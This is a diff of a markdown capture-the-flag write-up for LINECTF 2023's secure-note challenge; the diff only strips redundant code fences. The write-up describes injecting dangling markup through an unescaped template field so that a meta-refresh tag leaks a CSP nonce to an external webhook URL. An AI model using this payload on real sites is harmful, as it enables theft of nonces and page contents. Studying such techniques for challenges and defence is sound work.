@@ -8,7 +8,6 @@
 
 I learned this trick in an another-secure-store-note of LINECTF 2023. It was very expressive.
 
-````html
 ```html
 <div class=main>
   <h1>📕 <%- name %> secured notes 📕</h1>
@@ -33,19 +32,15 @@ I learned this trick in an another-secure-store-note of LINECTF 2023. It was ver
   <%- include('footer.ejs') %>
 </div>
 ```
-````
 
 I have to get a nonce value to satisfy Content Security Policy. The part `<%- name %>` is possible to insert html code.&#x20;
 
-````html
 ```html
 <script nonce=<%= nonce %> type='application/javascript'>  
 ```
-````
 
 We can see that the nonce is set without a single or double quotation. So, If we insert html code like `<meta http-equiv="refresh" content='1; url=https://webhook.site/asdf` , we can send the contents before the first single quotation of type attribute in script tag to an attacker site.&#x20;
 
-````html
 ```html
 <%- include('header.ejs') %>
 <body>
@@ -89,7 +84,6 @@ We can see that the nonce is set without a single or double quotation. So, If we
   <%- include('footer.ejs') %>
 </body>
 ```
-````
 
 However, chrome browser blocks HTTP URLs with "<" and "\n" character. So our dangling markup will not work in chrome based browser. It works in Firefox browser.
 
